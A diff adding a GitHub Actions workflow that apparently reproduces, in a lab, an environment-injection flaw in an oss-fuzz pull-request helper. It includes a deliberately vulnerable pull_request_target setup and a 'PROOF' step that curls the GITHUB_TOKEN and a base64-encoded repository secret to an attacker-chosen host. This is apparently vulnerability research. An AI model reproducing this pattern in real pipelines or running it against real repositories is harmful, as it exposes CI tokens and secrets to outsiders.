@@ -1,0 +1,75 @@
+name: PR helper (lab)
+on:
+  pull_request_target:
+    types: [opened]
+    branches:
+      - main
+    paths:
+      - 'projects/**'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    permissions:
+      contents: read
+      pull-requests: write
+
+    steps:
+      - uses: actions/checkout@v6
+      - name: Setup python environment
+        uses: actions/setup-python@v6
+        with:
+          python-version: 3.11
+          cache: pip
+          cache-dependency-path: |
+            infra/ci/requirements.txt
+
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r infra/ci/requirements.txt
+
+      - name: Check if authors are authorized to modify.
+        id: checkAuthor
+        env:
+          GITHUBTOKEN: ${{secrets.GITHUB_TOKEN}}
+          PRAUTHOR: ${{ github.event.pull_request.user.login }}
+          PRNUMBER: ${{ github.event.pull_request.number }}
+          LAB_OWNER: ${{ github.repository_owner }}
+          LAB_REPO: ${{ github.event.repository.name }}
+          CRITICALITY_SCORE_PATH: /bin/true
+        run: python infra/pr_helper_vulnerable.py
+
+      # --- every step below is a PRIVILEGED consumer of the job env, exactly like
+      # --- oss-fuzz's `actions/github-script` "Leave comments" step.
+      - name: "PROOF: privileged consumer uses GITHUB_API_URL + GITHUB_TOKEN + a repo secret"
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          CANARY: ${{ secrets.CANARY }}
+        run: |
+          echo "=== env inherited from pr_helper step ==="
+          echo "GITHUB_API_URL=${GITHUB_API_URL}"
+          echo "IS_READY_FOR_MERGE=${IS_READY_FOR_MERGE}"
+          echo "IS_INTERNAL=${IS_INTERNAL}"
+          C=$(printf '%s' "$CANARY" | base64 -w0)
+          echo "canary_b64=${C}"
+          echo "=== token-bearing request to the attacker-chosen host ==="
+          curl -sS -m 20 -H "Authorization: Bearer ${GH_TOKEN}" \
+            "${GITHUB_API_URL:-https://httpbin.org/anything}?canary=${C}" | head -c 3000 || true
+
+      - name: Leave comments (faithful oss-fuzz consumer, non-blocking)
+        if: always()
+        continue-on-error: true
+        uses: actions/github-script@v8
+        with:
+          github-token: ${{secrets.GITHUB_TOKEN}}
+          script: |
+            console.log('GITHUB_API_URL =', process.env.GITHUB_API_URL);
+            await github.rest.issues.createComment({
+              issue_number: context.issue.number,
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              body: process.env.MESSAGE
+            })
